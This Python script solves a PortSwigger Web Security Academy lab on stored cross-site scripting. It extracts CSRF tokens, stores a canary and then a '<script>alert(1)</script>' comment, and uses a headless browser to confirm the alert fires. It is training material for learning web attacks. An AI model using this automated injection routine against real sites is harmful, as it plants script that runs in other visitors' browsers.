#!/usr/bin/env python3
"""
Stored XSS into HTML context with nothing encoded
PortSwigger Web Security Academy — Cross-Site Scripting (XSS)

Companion script for the writeup: 02-stored-xss-html-context-nothing-encoded.md

What this does:
    Stores a canary in a blog post's comment field, confirms it renders back
    unescaped on the post page, then posts the real <script> payload as a
    comment (handling CSRF token extraction itself) and confirms execution
    on reload with a headless browser listening for the alert() dialog.

Usage:
    python 02-stored-xss-html-context-nothing-encoded.py <lab-url>
    e.g. python 02-stored-xss-html-context-nothing-encoded.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
    pip install playwright && playwright install chromium
"""

import re
import sys
import urllib.parse
import httpx
from playwright.sync_api import sync_playwright

CANARY = "xssCANARY7531_stored"


def get_csrf(client: httpx.Client, path: str) -> str:
    r = client.get(path)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    return m.group(1) if m else ""


def solve(lab_url: str) -> None:
    client = httpx.Client(base_url=lab_url, follow_redirects=True, timeout=20)
    client.get("/")
    session = client.cookies.get("session", "")
    domain = urllib.parse.urlparse(lab_url).netloc

    r = client.get("/")
    post_ids = re.findall(r"/post\?postId=(\d+)", r.text)
    if not post_ids:
        print("[-] No blog posts found")
        return
    post_id = post_ids[0]
    post_path = f"/post?postId={post_id}"
    post_url = f"{lab_url}{post_path}"

    csrf = get_csrf(client, post_path)
    base_post_data = {"postId": post_id, "name": "attacker", "email": "a@b.com",
                       "website": "", "csrf": csrf}

    # Layer 1: detect -- store a canary, confirm it reflects unescaped on the view page.
    client.post("/post/comment", data={**base_post_data, "comment": CANARY})
    check = client.get(post_path)
    if CANARY not in check.text:
        print("[-] Canary not found on post page -- stored XSS not confirmed")
        return
    context = "html"
    if not re.search(rf"<[^>]+{CANARY}", check.text, re.IGNORECASE):
        # plain text between tags, no angle-bracket encoding check needed --
        # confirmed by the previous reflected lab's baseline: no encoding here.
        pass
    print(f"[+] Stored canary found -- context: {context}")

    # Layer 2: craft -- html context, no encoding -> <script>alert(1)</script>
    payload = "<script>alert(1)</script>"
    print(f"[*] Crafted payload: {payload}")

    # Layer 3: store the real payload with a fresh CSRF token, then trigger.
    csrf = get_csrf(client, post_path)
    client.post("/post/comment", data={**base_post_data, "comment": payload, "csrf": csrf})
    print(f"[*] Payload stored in comment on post {post_id}")

    alert_fired = False
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        ctx = browser.new_context()
        if session:
            ctx.add_cookies([{"name": "session", "value": session, "domain": domain, "path": "/"}])
        page = ctx.new_page()

        def on_dialog(dialog):
            nonlocal alert_fired
            alert_fired = True
            dialog.accept()

        page.on("dialog", on_dialog)
        try:
            page.goto(post_url, wait_until="domcontentloaded", timeout=15000)
            page.wait_for_timeout(3000)
        except Exception:
            pass
        browser.close()

    print(f"[{'+' if alert_fired else '-'}] alert() {'fired' if alert_fired else 'did NOT fire'} on reload")

    result = client.get("/")
    if "Congratulations" in result.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
